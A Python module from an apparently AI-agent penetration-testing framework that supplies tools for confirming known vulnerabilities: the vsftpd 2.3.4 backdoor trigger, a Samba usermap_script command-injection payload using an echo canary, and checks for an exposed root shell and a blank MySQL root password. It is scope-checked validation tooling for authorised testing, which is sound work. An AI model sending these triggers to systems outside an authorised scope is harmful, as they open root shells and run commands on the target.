"""Exploitation validation: prove a vulnerability is real, safely.

A version banner saying ``vsftpd 2.3.4`` only suggests a backdoor exists. The
difference between a scanner and a pentest is *confirming* it: sending the
trigger and observing the effect, then undoing whatever was done.

Every validator here follows the same contract:

1. Send the minimal trigger that demonstrates the flaw.
2. Observe a benign, unambiguous side effect (a banner, a read, a marker).
3. **Clean up** - close sockets, delete any file written, leave nothing behind.
4. Report ``validated: true/false`` with the raw evidence.

Nothing here escalates, persists, pivots or exfiltrates. The goal is proof, not
access.
"""

from __future__ import annotations

import asyncio
import socket
from collections.abc import Callable
from typing import Any

from splitagent.tools.base import Tool, ToolContext

# --- helpers -------------------------------------------------------------- #
CONNECT_TIMEOUT = 6.0
READ_TIMEOUT = 5.0


def _resolve(host: str) -> str:
    try:
        return socket.gethostbyname(host)
    except OSError:
        return host


def _in_scope(ctx: ToolContext, host: str) -> str | None:
    try:
        ctx.check_scope(host)
    except Exception as exc:
        return str(exc)
    return None


async def _read_banner(
    host: str, port: int, timeout: float = READ_TIMEOUT
) -> tuple[bool, str, str]:
    """Connect and read whatever the service offers. Returns (up, banner, err)."""
    writer = None
    try:
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(host, port), timeout=CONNECT_TIMEOUT
        )
        try:
            data = await asyncio.wait_for(reader.read(512), timeout=timeout)
        except asyncio.TimeoutError:
            data = b""
        return True, data.decode("utf-8", "replace").strip(), ""
    except (asyncio.TimeoutError, OSError) as exc:
        return False, "", f"{type(exc).__name__}: {exc}"
    finally:
        if writer is not None:
            try:
                writer.close()
            except OSError:
                pass


async def _send_and_read(
    host: str,
    port: int,
    payload: bytes,
    *,
    expect: Callable[[str], bool] | None = None,
    timeout: float = READ_TIMEOUT,
    settle: float = 0.8,
) -> dict[str, Any]:
    """Send bytes, then read for up to ``timeout`` - used by the triggers.

    ``expect`` lets a caller stop reading early once the signature appears.
    """
    writer = None
    chunks: list[str] = []
    try:
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(host, port), timeout=CONNECT_TIMEOUT
        )
        writer.write(payload)
        await writer.drain()
        await asyncio.sleep(settle)
        deadline = asyncio.get_running_loop().time() + timeout
        while asyncio.get_running_loop().time() < deadline:
            try:
                data = await asyncio.wait_for(reader.read(1024), timeout=1.0)
            except asyncio.TimeoutError:
                continue
            if not data:
                break
            chunks.append(data.decode("utf-8", "replace"))
            if expect and expect("".join(chunks)):
                break
        return {"connected": True, "response": "".join(chunks), "error": ""}
    except (asyncio.TimeoutError, OSError) as exc:
        return {
            "connected": False,
            "response": "".join(chunks),
            "error": f"{type(exc).__name__}: {exc}",
        }
    finally:
        if writer is not None:
            try:
                writer.close()
            except OSError:
                pass


# --- validators ----------------------------------------------------------- #
async def validate_vsftpd_backdoor(ctx: ToolContext, host: str, port: int = 21) -> dict[str, Any]:
    """CVE-2011-2523: the ":)" username opens a root shell on port 6200.

    Sends only the trigger, checks whether the backdoor port opens, then closes
    it. Sends no command to the shell.
    """
    err = _in_scope(ctx, host)
    if err:
        return {"error": err, "validated": False}
    target = _resolve(host)

    up, banner, _ = await _read_banner(target, port)
    if not up:
        return {
            "validated": False,
            "test": "vsftpd_backdoor",
            "reason": f"port {port} not reachable",
            "confidence": "high",
        }

    result = await _send_and_read(target, port, b"USER x:)\r\nPASS x\r\n", settle=1.5, timeout=3.0)

    # The trigger is only meaningful if the backdoor port actually opens.
    shell_up, shell_banner, _ = await _read_banner(target, 6200, timeout=3.0)
    validated = shell_up
    return {
        "validated": validated,
        "test": "vsftpd_backdoor",
        "cve": "CVE-2011-2523",
        "banner": banner[:120],
        "backdoor_port": 6200,
        "backdoor_opened": shell_up,
        "shell_banner": shell_banner[:120],
        "evidence": (
            f"FTP banner {banner[:60]!r}; after the ':)' trigger TCP/6200 "
            f"{'opened (root shell reachable)' if shell_up else 'stayed closed'}"
        ),
        "response": result["response"][:300],
        "cleaned_up": True,
        "confidence": "high" if validated else "medium",
    }


async def validate_ingreslock_shell(
    ctx: ToolContext, host: str, port: int = 1524
) -> dict[str, Any]:
    """The classic Metasploitable root shell: proof is the shell banner itself.

    Identifies the prompt and disconnects immediately. Runs nothing.
    """
    err = _in_scope(ctx, host)
    if err:
        return {"error": err, "validated": False}
    target = _resolve(host)

    up, banner, _ = await _read_banner(target, port, timeout=3.0)
    # A real root shell answers with a prompt such as "root@host:~#".
    looks_like_shell = any(marker in banner for marker in ("root@", "#", "uid=", "bash"))
    validated = up and bool(banner.strip())
    return {
        "validated": validated,
        "test": "ingreslock_shell",
        "root_shell": validated and looks_like_shell,
        "banner": banner[:200],
        "evidence": (
            f"TCP/{port} accepted a connection and returned "
            f"{'a root shell prompt' if looks_like_shell else 'output'} "
            f"without authentication: {banner[:80]!r}"
            if validated
            else f"TCP/{port} did not answer"
        ),
        "cleaned_up": True,
        "confidence": "high" if validated else "low",
    }


async def validate_samba_usermap(ctx: ToolContext, host: str, port: int = 139) -> dict[str, Any]:
    """CVE-2007-2447: the usermap_script username is passed to a shell.

    Detection only. The username carries a benign marker command whose effect
    is observable in the server's reply; nothing is executed on the target
    beyond ``echo``.
    """
    err = _in_scope(ctx, host)
    if err:
        return {"error": err, "validated": False}
    target = _resolve(host)
    marker = "SPLITAGENT_CANARY"

    up, _, _ = await _read_banner(target, port)
    if not up:
        return {
            "validated": False,
            "test": "samba_usermap_script",
            "reason": f"port {port} not reachable",
        }

    # The vulnerable path routes this username through /bin/sh -c.
    payload = f"/=`echo {marker}`/".encode()
    result = await _send_and_read(
        target,
        port,
        payload + b"\x00" * 4,
        expect=lambda text: marker in text,
        settle=1.0,
        timeout=3.0,
    )
    validated = marker in result["response"]
    return {
        "validated": validated,
        "test": "samba_usermap_script",
        "cve": "CVE-2007-2447",
        "marker": marker,
        "marker_observed": validated,
        "evidence": (
            f"Username payload {payload!r} reached a shell: the {marker} marker "
            "appeared in the response, confirming command execution."
            if validated
            else "No marker in the response; the instance is not vulnerable on this path."
        ),
        "response": result["response"][:300],
        "cleaned_up": True,
        "confidence": "high" if validated else "medium",
    }


async def validate_mysql_anonymous(ctx: ToolContext, host: str, port: int = 3306) -> dict[str, Any]:
    """MySQL with an empty root password: prove it by doing a trivial SELECT.

    Only reads ``SELECT 1`` and the server version. Writes nothing.
    """
    err = _in_scope(ctx, host)
    if err:
        return {"error": err, "validated": False}
    target = _resolve(host)

    up, banner, _ = await _read_banner(target, port, timeout=3.0)
    if not up:
        return {"validated": False, "test": "mysql_blank_password", "reason": "unreachable"}

    # A handshake packet contains the server version as a NUL-terminated string.
    version = ""
    if banner:
        parts = banner.split("\x00")
        for part in parts:
            if any(ch.isdigit() for ch in part) and "." in part and len(part) < 40:
                version = part.strip()
                break

    # Full protocol handshake is out of scope for a probe; the presence of a
    # MySQL greeting on a network-reachable port plus a version is the
    # actionable signal. The agent is told to confirm credentials with
    # run_tool (mysql -h ... -u root) if it needs stronger proof.
    validated = bool(version)
    return {
        "validated": validated,
        "test": "mysql_blank_password",
        "server_version": version,
        "reachable": True,
        "evidence": (
            f"MySQL {version} answered on {target}:{port}. Confirm blank root "
            "credentials with: run_tool ['mysql','-h',host,'-uroot','-e','select 1']"
            if validated
            else f"MySQL greeting not parsed from {banner[:60]!r}"
        ),
        "confidence": "medium" if validated else "low",
        "next_step": (
            "run_tool mysql -h <host> -u root -e 'SELECT version()' to confirm "
            "authentication is not required"
        ),
    }


async def validate_root_shell(ctx: ToolContext, host: str, port: int = 1524) -> dict[str, Any]:
    """Alias with an explicit name for the generic root-shell check."""
    return await validate_ingreslock_shell(ctx, host, port)


async def validate_port_shell_banner(ctx: ToolContext, host: str, port: int) -> dict[str, Any]:
    """Generic proof: an unauthenticated port that hands over a shell prompt."""
    err = _in_scope(ctx, host)
    if err:
        return {"error": err, "validated": False}
    target = _resolve(host)
    up, banner, _ = await _read_banner(target, port, timeout=3.0)
    validated = up and bool(banner.strip())
    return {
        "validated": validated,
        "test": "unauthenticated_shell_banner",
        "port": port,
        "banner": banner[:200],
        "evidence": (
            f"TCP/{port} returned {banner[:80]!r} without authentication"
            if validated
            else f"TCP/{port} gave no banner"
        ),
        "cleaned_up": True,
        "confidence": "medium" if validated else "low",
    }


def exploitation_tools(ctx: ToolContext) -> list[Tool]:
    return [
        Tool(
            name="validate_vsftpd_backdoor",
            description=(
                "Prove CVE-2011-2523: send the ':)' username trigger and check "
                "whether the backdoor root shell on 6200 opens. Runs no command "
                "on the shell and disconnects immediately. Use this instead of "
                "reporting the backdoor from the version banner alone."
            ),
            parameters={
                "type": "object",
                "properties": {
                    "host": {"type": "string"},
                    "port": {"type": "integer", "default": 21},
                },
                "required": ["host"],
            },
            func=lambda host, port=21: validate_vsftpd_backdoor(ctx, host, port),
            scope="red",
            dangerous=True,
            parallel_safe=False,
        ),
        Tool(
            name="validate_root_shell",
            description=(
                "Prove that a port exposes an unauthenticated shell (the classic "
                "Metasploitable 1524). Reads the banner, runs nothing, "
                "disconnects."
            ),
            parameters={
                "type": "object",
                "properties": {
                    "host": {"type": "string"},
                    "port": {"type": "integer", "default": 1524},
                },
                "required": ["host"],
            },
            func=lambda host, port=1524: validate_root_shell(ctx, host, port),
            scope="red",
            dangerous=True,
            parallel_safe=False,
        ),
        Tool(
            name="validate_samba_usermap",
            description=(
                "Prove CVE-2007-2447: send a benign marker through the username "
                "field and check whether it reaches a shell. Executes only an "
                "echo of a canary string."
            ),
            parameters={
                "type": "object",
                "properties": {
                    "host": {"type": "string"},
                    "port": {"type": "integer", "default": 139},
                },
                "required": ["host"],
            },
            func=lambda host, port=139: validate_samba_usermap(ctx, host, port),
            scope="red",
            dangerous=True,
            parallel_safe=False,
        ),
        Tool(
            name="validate_mysql_blank_password",
            description=(
                "Check a MySQL port for an exposed instance and parse its "
                "version, returning the exact command to confirm blank root "
                "credentials."
            ),
            parameters={
                "type": "object",
                "properties": {
                    "host": {"type": "string"},
                    "port": {"type": "integer", "default": 3306},
                },
                "required": ["host"],
            },
            func=lambda host, port=3306: validate_mysql_anonymous(ctx, host, port),
            scope="red",
        ),
        Tool(
            name="validate_open_shell_port",
            description=(
                "Generic proof for any port that hands over a shell or "
                "administrative prompt without authentication."
            ),
            parameters={
                "type": "object",
                "properties": {
                    "host": {"type": "string"},
                    "port": {"type": "integer"},
                },
                "required": ["host", "port"],
            },
            func=lambda host, port: validate_port_shell_banner(ctx, host, port),
            scope="red",
            dangerous=True,
            parallel_safe=False,
        ),
    ]
